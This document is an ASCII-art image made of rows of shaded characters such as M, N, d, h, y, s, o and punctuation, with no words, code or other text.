MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdyhmmmmmmmNNNNmhyyhmmNNNNmyoo++++ooo++//+osyso+:::/+syhhhhhhdNNmhhddddhyyyysssssyhdmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmmNMMMNdyo+/://////::------:+hddhhhyyssoossyyssyhhddddhs+::::::::::::--:::://+oyhdmmmmNNNNNNNNNNNNNNNNNNNmmmmmmmmmNmmmmmmmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmdhyyyyyyyyyyyyyyhdmmmNNNNmNNNNNmNNNNNmmmdhhdNNmyoooo+/:--..-ohmNNmdhhhyysyyhhys+-...-:sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdsoosssyhmNNMNNdhdmNNNNNNNmdysoo+++ooo+oydmmddyo//+oyyhhhhysymNNdhddmmmdhhyyyysyyyyhdmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNNMMNMMMNmdyo///////:-----.:sdddyssssysssshdddddddddhyo/:-:::--------------:/++syyhdmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmdhyyyyyssssssssyhdmmmmNNNmmmNmmmNNNNNmmddhydNNdsyyyso/---..-/ymNNNmmdhysoosyhhyo/--..-+hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdsooo+/+shNMMNNmmNNMMMMMMNNmmdhysossso+oyhdmddhs+/+oyyhhhhsoodNNmhhdmmmmmdhysssssssyyhddmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmNNNNNMMMMMMMMMNmhs+////::---::-/sddhysssyyyssyhhddddhhyo/::---::-------------::/+osssydNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmdhyyyyyysssooooosydmmNNNNmmNNNNNNNNNNNmmdhyhmNNhoyhhyo/--...-/shdhysssyso+oyhdddy+:----+ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmysss+/+shNNMNNNNNNNNMMMMNNmmmmddhhyoo+++ooooooo+//oyyhhhyo/+hNNNdhdmmmmmmmdyyssssssssyhdmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmNNNNNMMMMMMMMMMMMNmyo////::://///oyhhyyssssssyyhddys+//:-----::------------:::/+oossshmMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmdhyyyyyyysso++//+shmmNNNNmNNNNNNNNNNNNmmdhydNNms+oyyyo/---...:oysoooydmmmmmNNNNmds/:---/sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmyyyso+oymNNNNNNNNNmddmNMMNNNNNNNmdyyyyysoo+++oso///osyyys+/+ymNNmhhdmmNNNNmdhyyssssooosyhdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMmhs++//:://+++syyysssyhhhddddho/---------:------------:://+osssyhmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmddhyyyyyyyysso++/+ohmmNNNNNNNNNNNNNNNNmmddhhmNNh++ossso/---..-/shddmmNNNNNMMMMMNNmy+:---:ohmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhhhyo/ohmNNNNmmNNNdhsydNMMMMMMNNmhyhddddyyyyhhys+:::/++++++osdNNmhhdmmNNNNmmmdhyssooooooshdmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMNmhs+/////+oyddyssyyysyyyys+/:::----:::::------:::::/++osyhhhdmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmdhyyyyyyyyyysoo++oydmNNNNNNNNNNNNNNNNmmdhyhmNmyoooo+++:---.-:/ydNNNNMMMMMMMMMMMNmyo/---:+ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhhyo/ohmNNNdyhNNNdhsydNMMMMMMNNdhhdmmmhysyddhyo/:--:://++oooydNNdhhdmmNNNNNNmmdhysoooooosyhdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMNmhs+/::/odmddddhso+///+/:::::::::::::::::::::://+osyyhhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmdhyyyyyyyyyyysoo+osdmNNNNNNNNNNNNNNNmmmdhhmNNdsssso++/:--..-/ohmNNNNNMMMMMMMMMMMNds+:--:/odmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmmddy+:+ymNNNhosmNNdhyhmNMMMMMMNNdhhmmmdysshhhyo/:-----::://++ohNNmhhddmNNNNNNNmmmhyyooo++oosyhdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhyo//osyhhso+++/////::::::::::::::::::://+++osyhddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmddhyyyyyyyyyyyyssooshmmNNNNNNNNNNNNNNmmdhhdNNmyssssso+/:--../oydNNmmmmmNNNNMMMMMMNmho:--::+ydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdy+:/sdNNNdosmNNmddmNMMMMMMNNNmdhdmmhsosyhys/---....--://+++ymNNdyhdmNNNNNNNNNNmmhysoooooossyhdmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhhys++//////::::::::::::::::::::::://++osyhddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNmmmddddmmmNNNNNNNNNNNNNNNNNNNNNNNNNNmmddyyyyyyyyyyyyyysooshdmNNNNNNNNNNNNNmmddhhmNNdyssyyso+/:-.../ohmNNNmmmmmmNNNNNMNNNmho/---:/sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmhs+:-/ymNNdyymNNmmNNMMMMMMNNNNmdyyhhyooyyyyo/:-......-://+++ohNNmhhdmmNNNNNNNNNNNmdhysooossssyyhmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMNNNNNmdyso+/::::::::::::::::::::::::///+osyhddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdhhyyyysssssyyhhdmNNNNNNNNNNNNNNNNNNNNNNNmmmdyysyyssyyyyyyyysosydmmNNNNNNNNNNNNmddhyhNMmhsyyyso+/:-...-/ohmNNNNNNNmmmddddhhhhyso/----:+ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmhso+:/ymNmdhhNNNNNNNMMMMMNmdmNNmhssso+shhyso/::--....-://++/+sdNNmhhdmmNNNNNNNNNNNmdhysssssssssyhdmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNmhyo+/::::::::::::::::::::://+osyyyhdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhyssoo+++++ooooooosssyhdmmmmNNNNNNNNNNNNNNNNNmdhyssssssoooosssssssydmmmmmNNNNNNNNmmddhhmNNdsooooo+/:--...-/shmNNNNmmmmmdhdddhhyyo/:-....-/odNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNddhysydhhmmmhyyhmNNNNNNMMMMMNddmNNmdyssooshhysso+//:-...-:://////smNNdhhdmmNNNNNNNNNNNNmdhyyssssoossyhdmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhyo/::::::::::::::::::://ossyhhdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhyssoooo+++++++++++ooooooooosshdmNNNNNNNNNNNNNNNmmhysooooo++++++++oosydmmNNNNNNNNNmmmddhhmNNds++++++/:--...-:+shddhhyyssso++osyhddddhs+-....-/ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmmmdhhyshdmmmNmddhhhhdmNNNNMMMNNmmmNmmmhyssooyyyyyso+++/:...--:///::+hNNNdhhmmmNNNNNNNNNNNNmmdhysoo++++osydmmNNNNNNNNNNNNNNNNNNNNNNNNmmmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmhs+/:::::::::::::::/++ossyhmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhyssoooooooooo++++++++++++++++++oshmNNNNNNNNNNNNNmmdysooo++//::---:/+oyhmmNNNNNNNNmmmddhhdNNmyoooo++//:-...-:+shddysosyhddhhyhdmmmmNNmdy+-...-:odNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdhdmmmNNNmmmdhyydmmNNNNNNmmNNNmdhyo+oosyyyssooooo+/:-..-::://+oydNNmhhdmmNNNNNNNNNNNNNmmdhso+////++oyhdmNNNNNNNNNNNNNNNNNNNNNNmmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhs+//::::::::/:///+ossydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdhyssooooossssssoo++/////////////++oooooydmNNNNNNNNNNmmdysoo++//:--....-:/shdmNNNNNNNNmmmdhhhNMNhsoo++///::----:+oydmNNNNNNMMMMMMMMMMMMMNNNds:-...-/ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMNmdmNNNMNNNNmmmmmmmmmmmmddmNNNNdhyyssssssso++osyyyys+:-...--:/oosymNNdhhdmmNNNNNNNNNNNNNNmmhyo+/////+oyhdmmNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdys+////////++osyhdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmdyoooooossyhhysoo++//////////////++oosoo++oshmNNNNNNNNNmdyso++/::-.......-:oyhmmNNNNNNNmmddhhmMNds+++///::--.-:/oyhdNNMMMMMMMMMMMMMMMMMMMMMNms/---.-:odNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdmNMMMMMNNNNNNNmddhhhysydmNmdhhhhhhsoo+++osyhddddhyo/-....-/+ooshNNmdhhdmNNNNNNNNNNNNNNNNmdyo+///++ossyhdmmNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyso///++oshhmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdyssssyhddmdyso++////:///////++oossysssooo++oshmNNNNNNNmdyo+//::-.......-:/osydmmNNNNNNmmdhhdNNms//+///::-...:+yhmmNNMMMMMMMMMMMMMMMMMMMMMMNNhs/:----+ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdmMMMMMMMNNNNNNNNmmmmdhdmmmhyhdmdddhyyyyyyhdmmmmmdhhy+:..--//++oydNNNdhddmNNNNNNNNNNNNNNNNmmdyo+++oossyyhdmmNNNNNNNNNNNNNNNNMMMMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNMNNmdhyyssydmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmmmmmmNNmdysoo+++/////+++oosyyyyyyysooooooooooshdmNNNmmdho+/:--.......-:/+osydmmmNNNmmmdhhdmNmy+//////:--..:+ydmNNMMMMMMMMMMMMMMMMMMMMMMMMMNmhs/:--:/ohmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmmNMMMMMMNNNMMMMMMMMMMMNNNNmdhdmmmmmmdddddmmNNNNmmmdddy+-.-://++osydNNmhhhdmNNNNNNNNNNNNNNNNNmdysoooossyyyhhdmNNNNNNNNNNNNNMMMMMNNmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMMNNmmmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdysoooooooooossyyhhhhyso+++++++ooossssoooydmmmmdyo/:-.......-:/+oossyhdmmmNmmmdhhdmNNy+///////:-.-:+ydNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmho:-::/+ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNNNNNmmmdhs:-.-:///+osymNNmhhdmmNNNNNNNNNNNNNNNNNmmhysoosssyyyyhddmNNNMMNNNNNNNNMMNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNMMMMMMMMMMMMMMNmdhyyyyyyyhddmNMMMMMMMMMMMMMMMMMNmhysoossssssyhhddmmdhyo+/////////++++oooooooosyhdmdho:-.......-:+oossssyyhdmmmmmdhhdmNmho////////:--:ohmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmy+::::/sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmdh+-.--///++osymNNmhhdmmNNNNNNNNNNNNNNNNNmmdhysssyyysssyhdmNNNNNNMNNNNNMMNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdhmNMMMNNNNNNNNMNmhs++////:::://+sdNMMMMMMMMMMMMMMNdyoo++osssyhdmNNmdhs++///////////++oo++++o+ooooosydmho:.....--:/+osssssssyyddmmmddhhmNNho+//::::::---+ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdy/::::+sdNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNms/-.-:///++oshmNNmhhdmmNNNNNNNNNNNNNNNNNNmdhyysyyyyysyydmNNNNMMMMMMMMMMMNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmNNNNNNNmmmmmNNdyo+//:::------:-:+hNMMMMMMMMMMMMMNhs++++oshdmNNmhs++//:/::::////++ososoo++++++oooooshmds:.....-/+ossssssssssshdmmdhhdmNNho/+//:--::---/ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmho/:::/oydNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMMNNNNho:-.-:///+oooymNNmhhdmmNNNNNNNNNNNNNNNNNNmddhyyyyyyyyyyhdmNNMMMMMMMMMMMNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNmNNmhs++/+ydhyso//------.-----:smmdhhhdmNNNMMMNmyso++shdmmdyo+/////:::::///+osssyssooooo++++ooosydmdy/-..-:/osyyyyssssssssyhdddhhmNNds+++//:-::-.-+ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmyo:-::/shmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNdyo/--:://////+ymNNdhhdmmNNNNNNNNNNNNNNNNNNNmddhyysssssosyhmNMMMMMMMNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmmmmmmNmds/:---:+ydds+:---.........-/+/::--:/+oydNMMNmdhyyyhdyys+++////////++oosyhhhhhyysssssssoooosshmNmho/:://osyyyyssssssssssyyhhhmNNds+////::::-..+hNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdy+:--:+sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNmhyo:--::///+++shmNNmhhdmmmNNNNNNNNNNNNNNNNNNNmdhysoo+/:://sdNNMMMMMNmNNMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmmmmmmmNNNNNmyo/:----:sdds/--...........---.....--::+hNMMMNmdhyysoooo+++++ooossyyhddmmNmmddhhyysssssssoosydNmdy+//+osyyyyysssssssoooosshmNNds+///:///-..-+hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdo/----/sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNmddy/--::///+oosshdNNmdhddmNNNNNNNNNNNNNNNNNNNNmmhso/:--...:ohmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhyyhdmNNNMNNMMNdyo/---..-oyy+--...........---.......---+hMMMNNdyoo++++oooshhdddddmmmmNNNNMNNNmmdhyyssossssooymmmhyo+ossyyyysssssssooooooydmmhs+//::--:-..-+ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmy+-...-/sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdy+--:://++oossyymNNmdhhmmmNNNNNNNNNNNNNNMNNNNNmhs+:-.....-+ydNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNMMMMMMMMMMMMMMMMMMMMMMMMMNNmhysoshmNNNMMMMMMMMNdo+::-...:os+:-............:-........--:smMMNmyo+++++osyhdmNNNmdmmmmmmmmdddmmmddhyysoooossoosdmmdhsossyyysssssssssooo++ohddy+////:::--.-:ohNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNho:....-/ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdy+---://++osssssyhmNNddhdmmNNNNNNNNNNNNNNNNNNNNNdyo:-......:/sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmds+oyhdNMMMMMMMMMMMMNmyo/:-...-/o+:-...........-::-.......---/yNMNms+/+++oshdmNmmdhysooooo+++++++ooooossooooooooosdmNmdhysssssssssssssooo+++oyyo+/::://+/-.-+ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmho-...../ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmy+---::/+oossssooshmNNmhhddmNNNNNNNNNNNNmmNNNMMNNmhs+:-......:odmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyssshmNMMMMMMMMMMMMMMMNho/:--..-:oo:-............::-........-.-/dMMNdysooosyyhhyso++//:::///::////++ooooo+++++ooosymNNNmdysssssssssssssoo++++o++////::://:--/ymNMMMMMMMMMMNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdy/.....-+ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmho:---://++oooooo+oymNNmhhhdmNNNNNNNNNmmmmNMMMMMNNmhs+-.......:shmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNdysyydmNMMMMMMMMMMMMMMMMMNh+/:--..-:oo/-...........-::-...........-yNMMNNmdhs+++ooo++++//::::////////+ooooo+++++++++oymNNNmdhsooosssssssoo++++o+////+++////:../sdNMMMMMMMMMMMNNmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds:.....-odNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds/--::///++oooo++//sdNNmdhhdmmNNNNNNNmmNNMMMMMMMNNmds/-.....-:oydmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNMMMMMMMMMMMNNNmhssydmNMMMMMMMMMMMMMMMMMMMNh+/:--.--:+o:-...........-::-............+hmMMMNmho++++oooooo+++///++++++ooossssooo+o++++++odmNNNmdysooooossoo+++++o+/:::/+++///:-.:sdNMMMMMMMMMMNNmmhhhddmNNmmNNNNMMMMMNNMMMMMMMMMMMMMMMMNds:.....:ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdy+:-::////+oo++++///ohmNNmhhddmmNNNNmmmNMMMMMMMMMMMNds/-....:/oyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmhyydmNMMMMMMMMMMMMMMMMMMMMMNy+::-----:++:---..........-:--...........-:+ydNNNdyo+++ooyyhhhyyyyyyyyyyyyhyyssoooooooooooooydNNNmmhso+++ooo++/+++++/:::-:::::/:--:+hNMNNMMMMMMMNNmddhhyyyysooooshdmNNNNNNNMMMMMMMMMMMMMMMMNdo:...../ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdy+:--::////+++++/+//+ohmNNmdhddmmmmmmmNNMMMMMMMMMMMNNdy/-..-:+syyyhmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhhdNNMMMMMMMMMMMMMMMMMMNMMNdo/:--.---:++:----.........--:-...........---:+hNNmdyssssydmmNNNmddddddddmmmmdhhyssssooooooooydNNNNNmhs+++++///////::--::------:---:ohmNNNNMMMNNmmdhyhmmmmNmddhhhhhdmNNNNNMMMMMMMMMMMMMMMMMMMNho:....-/ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdy+:---::////++++++//+osydNNNmhhdddmmmNNMMMMMMMMMMMMMMNmho:--/+syyyyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdddmNNMMMMMMMMMMMMMMMMMMMMMMmy+:----.--:+/:------.......--::-...........----+ymNmdhhyyyhdmNNNmddddhhddmNMMNNmmdhyysssoooosdmNNNNNmdyo++//::///:--.-----.........-/shmNNNNmmdhyhhyyhdmmNNMMMMMMNNNNNMMMMMMMMMMMMMMMMMMMMMMMMmh+-...../ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmds+:----:://+///////+osyyyhmNNNdhhddmNNMMMMMMMMMMMMMMMMMNdy+//+syyyyyhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNMMNNmdddmNNMMMMMMMMMMMMMMMMMMMMMMNho/:---..-:/+:::-----.......---::-...........----:smNNdhysssydmNNNddddddmmNNMMMMNNmdhyysssssyhmNNNNNNmmhs++/////:--....---...........-/oyyysssssssyhyyhhhdmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmy/-....-/ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
